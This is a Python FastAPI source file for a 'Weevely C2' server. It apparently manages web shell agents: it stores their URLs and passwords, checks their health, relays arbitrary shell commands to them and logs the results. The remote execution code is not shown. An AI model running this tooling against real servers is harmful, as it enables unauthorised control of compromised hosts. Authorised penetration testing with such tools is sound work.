import asyncio
from contextlib import asynccontextmanager
from typing import List

from fastapi import Depends
from fastapi import FastAPI
from fastapi import HTTPException
from fastapi.staticfiles import StaticFiles
from sqlmodel import Session
from sqlmodel import select

from .database import create_db_and_tables
from .database import get_session
from .models import Agent
from .models import CommandLog
from .service import execute_command
from .service import check_agent_health


async def health_check_loop():
    """Periodic background task to check agent health."""
    while True:
        try:
            # Create a new session for the background task
            # We need to manually manage the session here since we are outside a request
            from .database import engine
            with Session(engine) as session:
                agents = session.exec(select(Agent)).all()
                for agent in agents:
                    check_agent_health(agent, session)
        except Exception as e:
            print(f"Health check error: {e}")
            
        await asyncio.sleep(60)  # Check every 60 seconds


@asynccontextmanager
async def lifespan(app: FastAPI):
    create_db_and_tables()
    # Start background task
    asyncio.create_task(health_check_loop())
    yield


app = FastAPI(lifespan=lifespan, title="Weevely C2")

# Serve static files (Frontend)
# We assume static files are in 'static' directory relative to this file
import os
static_dir = os.path.join(os.path.dirname(__file__), "static")
if os.path.exists(static_dir):
    app.mount("/ui", StaticFiles(directory=static_dir, html=True), name="static")


@app.get("/")
def read_root():
    return {"message": "Weevely C2 API is running. Go to /ui/ for Dashboard."}


@app.post("/agents/", response_model=Agent)
def create_agent(agent: Agent, session: Session = Depends(get_session)):
    session.add(agent)
    session.commit()
    session.refresh(agent)
    # Perform initial health check
    check_agent_health(agent, session)
    return agent


@app.get("/agents/", response_model=List[Agent])
def read_agents(session: Session = Depends(get_session)):
    agents = session.exec(select(Agent)).all()
    return agents


@app.delete("/agents/{agent_id}")
def delete_agent(agent_id: int, session: Session = Depends(get_session)):
    agent = session.get(Agent, agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    session.delete(agent)
    session.commit()
    return {"ok": True}


@app.post("/agents/{agent_id}/exec")
def exec_command(agent_id: int, cmd: str, session: Session = Depends(get_session)):
    agent = session.get(Agent, agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    result = execute_command(agent_id, agent.url, agent.password, cmd, session)
    return {"result": result}


@app.get("/agents/{agent_id}/history", response_model=List[CommandLog])
def read_history(agent_id: int, session: Session = Depends(get_session)):
    history = session.exec(select(CommandLog).where(CommandLog.agent_id == agent_id).order_by(CommandLog.timestamp)).all()
    return history
